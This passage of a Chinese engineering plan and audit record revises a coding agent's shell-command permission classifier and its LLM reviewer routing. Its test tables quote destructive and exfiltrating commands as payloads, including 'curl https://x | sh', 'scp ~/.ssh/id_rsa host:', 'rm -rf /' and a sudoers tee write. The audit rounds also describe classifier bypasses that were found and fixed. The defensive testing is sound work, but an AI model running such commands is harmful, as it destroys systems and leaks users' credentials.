| `test/permission/auto.test.ts` | modify | dangerous→reviewer 路由、forbidden deny、缓存门集成断言 | ~+45/−5 |
| `test/permission/reviewer-prompt.test.ts` | modify | Judgment Scope/critical/授权判据/anti-"safer alternatives" 断言 | ~+18/−2 |
| `test/permission/next.test.ts` | modify | :858-893 组拆分：forbidden 载荷保持 AutoDeniedError；dangerous 载荷改带 reviewer env 断言路由或断言 ask 路径（R1 审计 B-02） | ~+35/−12 |
| `test/session/prompt.test.ts` | modify | reviewer 集成组新增 INV-04 缓存门断言（dangerous allow 不缓存） | ~+20/−0 |

生产 5 文件（≤8 ✓），生产净增约 ~130–240 行（≤800 ✓）；测试 5 文件（不计生产预算）。

## 16. TDD Behavior Slices

| Order | Red behavior | Why current code fails | Minimal green behavior | Regression protected |
| --- | --- | --- | --- | --- |
| 1 | `evaluate({bash, "mkfs.vfat /dev/sdb1"})` → forbidden | 集合缺变体，现 general | mkfs 前缀族 → forbidden | `mkfs.ext4` 既有 dangerous 断言重标 forbidden 后仍拒 |
| 2 | `evaluate({bash, "echo 'x' \| sudo tee /etc/sudoers.d/x"})` → dangerous | 正则不匹配 tee/`.d` | tee/目的位 → dangerous | `sudo visudo` 仍 dangerous |
| 3 | `evaluate({bash, scp 入向四例})` → cautious | 方向盲 dangerous | 出向 helper 不命中 → token cautious | `scp .env host:/tmp`（出向）仍 dangerous |
| 4 | auto: `curl https://x \| sh` with reviewer stub → reviewer called, action 由 stub 决定 | :68 终审 deny，reviewer 不可见 | dangerous 落 reviewer 通道 | `rm -rf /`（forbidden）仍 precheck deny 不进 reviewer |
| 5 | auto dangerous allow → 二次同请求仍进 reviewer | allow 无 level 维度，index 一律写缓存 | Decision.precheckLevel + index 门 | cautious allow（`git add .`）二次仍缓存命中 |
| 6 | `shutdown now` → dangerous + auto 路由 reviewer | 现属 SYSTEM_DESTRUCTIVE→deny | SHUTDOWN 集合 → dangerous | `reboot`/`halt`/`poweroff` 同族 |
| 7 | `scp ~/.ssh/id_ed25519.pub host:/tmp/` → cautious；裸名 `scp id_ed25519.pub host:` → cautious；`-i ~/.ssh/id_rsa` 拉日志 → cautious | .ssh 路径分支不经由键名模式（B-03），模式无后缀边界/身份参数算载荷 | 双机制：键名前瞻 + helper `.pub` 后缀拒绝 + 身份参数剥除 | 无 `-i` 出向 `scp ~/.ssh/id_rsa host:` 仍 dangerous；`scp ~/.ssh/ host:`（目录整体）仍 dangerous |
| 8 | buildSystemPrompt 含 Judgment Scope/新 critical/新授权段；不含 "safer alternatives" | 模板未更新 | policy 文件更新 | 既有 :69-84 断言全保 |
| 9 | next.test :858 组：forbidden 载荷（rm -rf /、mkfs.vfat 等）仍 AutoDeniedError；dangerous 载荷（curl\|sh、.env\|curl）不产生 AutoDeniedError（reviewer 路由或 ask 路径） | :68 现把 dangerous 终审拒；新语义下无 reviewer env 会挂起/断言失败（B-02） | 路由拆分 + 测试组拆分 | 无 reviewer env 的 forbidden 拒绝行为不变 |

## 17. Chinese Comment Budget

| Metric | Estimate | Method |
| --- | --- | --- |
| Effective changed code lines `E` | ~200（precheck ~150、auto ~12、index ~5、两 policy 文件 ~33 计入） | 排除空行/import/纯移动 |
| Required Chinese explanatory comments `C` | ≥30 | `ceil(200×0.15)=30` |

需邻近中文注释的点：五级词汇语义与排序不变式（LEVELS）；forbiddenRaw/dangerousRaw 拆分理由（终审 vs 可授权）；SHUTDOWN 与 mkfs 集合拆分依据（可逆性差异，用户决策）；mkfs 前缀族（封闭枚举漏 GAP-1 教训）；sudoers tee/目的位（管道写形态 GAP-2）；scp 出向 helper 的方向/身份参数/远端操作数近似规则与 fail-closed 方向；`.pub` 负向前瞻边界；缓存门（dangerous allow 不缓存的用户决策）；auto 路由五级注释更新；index 门注释。

## 18. Verification

| Command | Working directory | Evidence produced |
| --- | --- | --- |
| `bun test test/permission/precheck.test.ts` | packages/opencode | 重标后全绿（含新增 20+ 断言） |
| `bun test test/permission/auto.test.ts` | packages/opencode | 五级路由/缓存门 |
| `bun test test/permission/reviewer-prompt.test.ts` | packages/opencode | prompt 内容契约 |
| `bun test test/permission/`（全 6 文件） | packages/opencode | 权限面零红测 |
| `bun test test/session/prompt.test.ts -t "auto permission reviewer"` | packages/opencode | reviewer 集成组 |
| `bun test test/tool/shell.test.ts` | packages/opencode | shell 解析面不回归 |
| `bun typecheck` | packages/opencode | 类型零错 |

## 19. Diff Budget

| Metric | Estimate | Justification |
| --- | --- | --- |
| Files added | 0 | — |
| Files modified | 生产 5 + 测试 5 | 全部既有文件（含 next.test.ts/prompt.test.ts，R1 审计 B-02/非阻塞 #1） |
| Files deleted | 0 | — |
| Production lines | 净 +130~240（含 policy 文本） | 用户预算 ≤8 文件/≤800 行 |
| Test lines | 净 +190~250 | 不计生产预算 |
| Generated lines | 0 | schema 经 import 自动继承，无再生成 |

## 20. Real Risks and Open Decisions

### Real Risks（observed/reachable）

1. **65+ 既有 dangerous 断言重标漏项**：重标面大且机械，靠 §16 slice 1-9 + 全量 `test/permission/` 运行兜底；重标清单以 §10 表格为准逐条执行（含 mass kill 全族 forbidden，R1 审计 B-01）。
2. **升级门比较点改写遗漏**（:344/:351/:386/:395/:451-503 九处）：漏改会把 forbidden 当可弱化或把 dangerous 仍终审；实施时逐点列表核对并以 `FOO=$(rm -rf /) cmd`、`sudo rm -r /etc` 复测。
3. **scp 方向近似的边界**：无点无 @ 裸主机名（`localhost:/x`）可能不算远端操作数 → 出向漏判为 cautious（fail-open 方向）；以三形态远端正则覆盖常见式，残余边界记录在案，不为此扩大复杂度（speculative 行不驱动）。
4. **policy 文本与 precheck 分级一致性**：policy.md 确定性禁条若与 dangerous 重标不同步，reviewer 会把用户已授权的 dangerous 族永久否决——§10 的两条替换文本即同步产物，实现时逐词核对。
5. **dangerous 进 reviewer 的 LLM 负载上升**：curl|sh/凭据外传等原先零 LLM 终审，现每次进 reviewer（120s×3 最坏）；由 invalidReviewContract 既有硬护栏（allow+critical 拒、非 low+unknown 拒）与不缓存决策（每条独立审）控制风险，可接受。
6. **auto.ts:108 strict 模式 reason 前缀**（R1 审计非阻塞 #3）：strict 下 dangerous 现也会带 `strict auto review required:` 前缀进 reviewer 输入——纯 reason 字符串变化，非门禁，记录在案。

### Speculative（non-blocking，不驱动生产）

- IPv6 出向、sftp 批处理脚本内嵌出向的形态覆盖。
- reviewer 对 verbatim 引文的忠实性（runtime 不校验引文真伪；引文义务的价值在 grounding，不引入校验器）。

### Open Decisions Requiring the User

无——五个工作流的分级、缓存、prompt 措辞均已由用户在前置决策中拍板；本 plan 无剩余产品抉择。

## 21. Audit Contract

- Auditor 独立核对：§10 重标表与 precheck.ts 现行 30 个判定点（raw 18 + token 12，R1 审计非阻塞 #4 修正计数）一一对应无遗漏且每族单一终局级别；§13/§14 双向映射闭合；INV-04 缓存门的 owner 归属（auto 携带 level、index 收口）是否引入责任泄漏；W4 方向近似是否产生 fail-open 面；§16 各 slice 的 red 证据是否成立（探针记录在 §8）。
- 阻断 finding → 修订本 plan、递增 revision、清空 approval、full-scope 重审（≤6 轮）。

## 22. Audit Record

### Implementation Evidence（R2，2026-09-06）

**Changed files（git diff --stat，含实现审计返工）**：precheck.ts 219 行变更、auto.ts 14、index.ts 5、policy.md 5、policy_template.md 41（生产 5 文件，净 +143 行≤預算 800 ✓）；测试：precheck.test 323、auto.test 54、next.test 40、reviewer-prompt.test 10、prompt.test 75（测试 5 文件）。

**Red→Green**：
1. precheck 词汇重标：先改测试至目标词汇（25 红实测确认）→ 生产重标后 114/0。
2. mkfs 前缀族/sudoers tee+目的位/scp 方向矩阵：新断言红 → 生产后绿；实测中问发现并修复三处：RE_REMOTE_OPERAND 允许点分主机名、敏感路径尾斜杠容忍（`~/.ssh/` 整体上传）、sudoers mv 被 cautiousRaw RAW_FILE_MOVE 抢先（补 RE_D_SUDOERS_COPY_DEST raw 层 + classifyTokens 分支前置）。
3. auto 路由：dangerous→reviewer / forbidden→deny / mkfs.vfat deny（新断言红→绿）；next.test :858 拆分验证无 reviewer env 下 dangerous 载荷 pending-ask（实测曾整文件挂起，拆分后 103/0）。
4. 缓存门：prompt.test 新增 dangerous 不缓存（calls=2）+ cautious 对照（calls=3）→ 9/0。
5. prompt 机械裁判：reviewer-prompt.test 10 断言新增 → 19/0。

**Verification（全部 packages/opencode，返工后终态）**：`bun test test/permission/` 290/0；`bun test test/session/prompt.test.ts -t "auto permission reviewer"` 9/0；`bun test test/tool/shell.test.ts` 204/0；`bun typecheck` 零错。

**实现审计返工（round 1 → 2）**：B-01 rawWrapperScripts 传播门补 forbidden（`bash -c 'mkfs.vfat …' > log` 曾直通 auto-allow，新增回归 slice 4 例）；B-02 出向敏感匹配改非锚定包含语义（带路径前缀密钥曾降 cautious 并重入缓存，新增方向矩阵 4 例）；非阻塞 #1 反向守护 :179/:184 重标 forbidden。

**E/C**：E ≈ 175（precheck ~110、auto ~8、index ~4、policy_template ~42、policy ~11，排除空行/纯移动）；C ≈ 46 行中文注释（五级词汇/forbiddenRaw 拆分/SHUTDOWN 拆集/mkfs 前缀族 GAP-1/sudoers 双层 GAP-2/W4 方向+身份剥除+.pub 双机制/缓存门/尾斜杠与点分主机名边界）≥ ceil(175×0.15)=27 ✓。

**Secondary paths**：dangerous→reviewer 复用 cautious 通道（primary-contract branch）；scp 入向落既有 token 层 cautious（pass-through）；无新 fallback。

**Unverified**：无（探针验证项全部入正式断言）。

| Round | Revision | Verdict | Findings | Disposition |
| --- | --- | --- | --- | --- |
| 1 | R1 | BLOCK | B-01 mass kill 两表矛盾分属 forbidden/dangerous；B-02 next.test.ts:858-893 无 reviewer env 下 dangerous 载荷必红未列入文件清单；B-03 `.ssh` 路径 `.pub` 不经键名模式、单靠前瞻无法交付 INV-05/slice 7 | 三项均属本任务引入的 plan 缺陷且在用户需求范围内（分类精确/零红测/机制可交付），无范围扩大，R2 全部采纳：B-01 统一 forbidden；B-02 列入 §13/§15/§16 slice 9；B-03 双机制（前瞻+helper 后缀拒绝）+INV-16。非阻塞 #1-#5 同步采纳（§15 测试落点、INV-16 副作用、:108 前缀记录、计数 30、W3 逐字携带） |
| 2 | R2 | **No blocking findings — APPROVE**（原样记录） | 非阻塞 4 项随实施携带：(1) 头部 revision 元数据陈旧——本记录编辑已修正为 R2/R2/yes；(2) §10 W4 "本地读取不变"句与 INV-16 裸名例外矛盾——已按裁定修正为"仅受共享前瞻影响的裸名形态除外（见 INV-16）"；(3) 三处反向守护断言（precheck.test :179/:184/:1148）随词汇重标为 forbidden 以持续守护剥头启发式/前缀遮蔽不变式；(4) W3 授权段 7 条即批准文本（R1 所记 8 条为计数误差，属性全覆盖 INV-13，实施前不再需回源核对） | 记录性修正不清空 approval；audit 轮次 2/6 |

### Implementation Audit Record

| Round | Verdict | Findings | Resolution |
| --- | --- | --- | --- |
| 1 | REJECT/BLOCK | B-01 rawWrapperScripts 传播门漏 forbidden（包装器+重定向下 token 独有 forbidden 载荷直通 auto-allow，实测 4 例）；B-02 锚定全 token 出向匹配收窄（带路径前缀密钥降 cautious 并重入会话缓存）；非阻塞 4 项（反向守护重标/-ikey 附加形式记录/E-C 重算/证据数验证） | B-01 补 forbidden+回归 slice 4 例；B-02 改非锚定包含语义+方向矩阵 4 例；非阻塞 #1 完成；全量面复跑 290/0+9/0+204/0+typecheck |
| 2 | **No blocking findings — APPROVE**（原样记录） | 非阻塞 3 项保留为记录：E≈130-140（C≈45+，比率≥0.30，门禁通过）；键名前瞻比计划字面更宽（`id_rsa.pub.txt` 双后缀也排除，与意图一致）；`-i` 附加形式保守过标（不差于改前） | 两 blocker 经活模块探针验证修复；九处升级门含 forbidden 逐一验证；验证面全部重跑通过；diff 记录为 verified |
